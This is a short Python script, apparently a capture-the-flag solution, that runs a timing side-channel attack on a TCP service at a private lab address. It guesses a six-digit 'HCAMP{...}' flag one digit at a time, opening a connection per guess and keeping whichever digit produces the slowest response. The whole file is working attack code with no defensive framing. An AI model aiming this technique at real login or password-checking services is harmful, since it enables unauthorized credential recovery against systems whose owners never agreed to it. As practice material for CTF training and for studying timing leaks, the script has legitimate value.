import socket
import time
import string

def exploit():
    TCP_IP = '192.168.200.190'
    TCP_PORT = 3333
    password = 'HCAMP{'
    strings = "0123456789"
    test_count = 0

    print("[+] Connecting to %s:%d" % (TCP_IP, TCP_PORT))

    for i in range(6):
        max_running_time = 0  # 가장 큰 running_time을 저장하는 변수
        digit_to_add = None  # password 변수의 뒤에 추가할 숫자
        for c in strings:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                max_time = 0
                s.connect((TCP_IP, TCP_PORT))
                #print(s.recv(1024))
                s.recv(1024)
                start_time = time.time()
                password_temp = password + c
                print("[*] Send password:", password_temp)
                s.send(password_temp.encode())
            
                #print(s.recv(1024))
                s.recv(1024)    
                response = s.recv(1024)
                end_time = time.time()
                running_time = end_time - start_time
                print("    running_time", running_time,"\n")

                if not response:
                    print("[-] Connection closed by the server. Reconnecting...")
                    continue

                if running_time > max_running_time:
                    max_running_time = running_time
                    digit_to_add = c

                test_count += 1

            except socket.error as e:
                print("[-] Socket error occurred:", str(e))
                print("[-] Reconnecting...")
                continue

            finally:
                s.close()

            time.sleep(1)

        if digit_to_add is not None:
            password += digit_to_add

    password += "}"    
    print("Final password:", password)

exploit()

